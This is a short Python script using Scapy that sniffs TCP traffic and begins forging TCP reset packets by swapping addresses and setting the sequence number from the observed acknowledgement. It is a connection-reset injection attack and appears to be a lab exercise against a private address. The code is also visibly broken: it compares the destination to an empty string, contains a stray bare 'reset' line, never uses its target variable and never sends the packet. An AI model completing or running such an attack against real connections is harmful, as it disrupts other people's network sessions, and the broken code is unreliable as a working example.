from scapy.all import *
import random

target_ip = "192.168.13.30"

def pkt_callback(packet):
    if (TCP in packet):
        print("seq: %d, ack: %d\n" % (packet[TCP].seq, packet[TCP].ack))
        if (packet[IP].dst == ""):
            resetPkt = packet
            #set reset packet
            resetPkt[TCP].flags = 'R'
            #set ack number
            ack = resetPkt[TCP].ack
            dst = resetPkt[IP].dst
            src = resetPkt[IP].src
            resetPkt[TCP].seq = resetPkt[TCP].ack
            reset
            resetPkt[IP].src = dst
            resetPkt[IP].dst = src


random.seed()
interface = "ens10"
conf.verb = 0
sniff(iface=interface, prn=pkt_callback, filter="tcp", store=0)
